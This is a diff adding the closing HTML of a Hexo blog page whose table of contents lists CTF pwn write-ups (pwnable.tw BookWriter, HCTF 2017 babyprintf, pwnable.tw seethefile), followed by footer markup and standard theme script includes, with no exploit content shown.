+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnable-tw-BookWriter"><span class="nav-number">1.</span> <span class="nav-text">pwnable.tw BookWriter</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">题目漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程"><span class="nav-number">1.2.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HCTF-2017-babyprintf"><span class="nav-number">2.</span> <span class="nav-text">HCTF 2017 babyprintf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目概述"><span class="nav-number">2.1.</span> <span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目漏洞-1"><span class="nav-number">2.2.</span> <span class="nav-text">题目漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程-1"><span class="nav-number">2.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwnable-tw-seethefile"><span class="nav-number">3.</span> <span class="nav-text">pwnable.tw seethefile</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目概述-1"><span class="nav-number">3.1.</span> <span class="nav-text">题目概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目漏洞-2"><span class="nav-number">3.2.</span> <span class="nav-text">题目漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程-2"><span class="nav-number">3.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
